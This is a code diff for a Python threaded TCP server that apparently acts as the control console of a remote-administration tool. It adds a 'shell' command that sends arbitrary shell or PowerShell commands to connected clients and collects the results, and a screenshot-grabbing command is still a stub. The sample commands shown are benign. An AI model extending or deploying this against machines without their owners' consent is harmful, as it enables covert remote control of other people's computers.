@@ -4,6 +4,7 @@ import socketserver
 import threading
 # Threads is used to run multiple I/O-bound tasks simultaneously, here, requests
 # https://docs.python.org/3/library/threading.html 
+import re
 
 # Global dic to track connected and their socket
 # Needs to be refactored, Explore the Reactor Pattern in the future
@@ -35,10 +36,11 @@ class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
 
                 # send back data
                 self.request.sendall(b'Alive ping back received')
-                # self.request.sendall(b'powershell start brave www.google.ca') 
-                # self.request.sendall(b'powershell ls -n')
+                
         except ConnectionAbortedError :
-            print('Client disconnected')
+            print('Connection was aborted by the local system')
+        except ConnectionResetError :
+            pass # Connection was forcibly closed by the remote host
     
 
     def finish(self) :
@@ -72,26 +74,28 @@ def central_commands():
                     exit = True
                     break
             
-            command = msg.split(' ')
-            if command[0] == 'help':
+            menu_option = msg.split(' ')[0]
+            if menu_option == 'help':
                 list_commands_available()
-            elif command[0] == 'list':
+            elif menu_option == 'list':
                 print_clients()
-            elif command[0] == 'send_echo':
+            elif menu_option == 'send_echo':
                 send_echo(msg)
-            elif command[0] == 'get_SC':
-                get_SC(command)
+            elif menu_option == 'get_SC':
+                get_SC(msg)
+            elif menu_option == 'shell':
+                send_shell(msg)
 
     except KeyboardInterrupt:
         print('Central commands terminated')
 
 
 def list_commands_available():
-    print('help : List all the commands available')
+    print('\nhelp : List all the commands available')
     print('list : To list clients connected to the server')
     print('send_echo [clientIP@port] ["message"]')
     print('get_SC [clientIP@port] : Get a ScreenShot of the client Desktop')
-    print('shell [clientIP@port] [\'Shell Command\'] : Send a Shell/Powershell command to the client')
+    print('shell [clientIP@port] [\'Shell Command\'] : Send a Shell/Powershell command to the client and get the result')
 
 
 def print_clients():
@@ -101,6 +105,7 @@ def print_clients():
         print('Clients : ')
         for client in connected_clients:
             print(f'{client[0]}@{client[1]}')
+        
 
 # Verify that the socket is not closed, share the method from client
 def send_echo(msg: str):
@@ -119,9 +124,33 @@ def send_echo(msg: str):
             print(f'Client {client_ip}@{client_port} is not is the list of connected client')
 
 
-
 def get_SC(client):
     pass
+
+# Replacing the send_echo test
+# Do some verification on the user input
+# PRINT EXEMPLES
+# shell 127.0.0.1@57693 powershell ls -n
+
+# self.request.sendall(b'powershell start brave www.google.ca') 
+# self.request.sendall(b'powershell ls -n')
+def send_shell(msg: str):
+    client_ip, client_port = msg.split(' ')[1].split("@")
+    client_port = int(client_port)
+    command = re.split('@\d+ ', msg)[1] # Do some join if there's more than 1 @
+
+    for client in connected_clients:
+        if client[0] == client_ip and client[1] == client_port:
+            client_socket = connected_clients.get(client)
+            print(f'Command : {command} sent')
+
+            client_socket.sendall(command.encode('utf-8')) 
+            # The Data back should be caught by the open loop Handler
+
+        else :
+            print(f'Client {client_ip}@{client_port} is not is the list of connected client')
+
+
 
 
 if __name__ == '__main__':
@@ -132,7 +161,7 @@ if __name__ == '__main__':
         with ThreadedTCPServer((HOST, PORT), ThreadedTCPRequestHandler) as server : 
             print('--------------------------------------------')
             print(f'Server Hosting @ : {HOST}:{PORT}')
-            print('--------------------------------------------\n')
+            print('--------------------------------------------')
 
             # Run the server in a separate thread to control it from the main thread
             server_thread = threading.Thread(target=server.serve_forever) # In a loop, Handling one request at a time until shutdown. (CTL+C) 
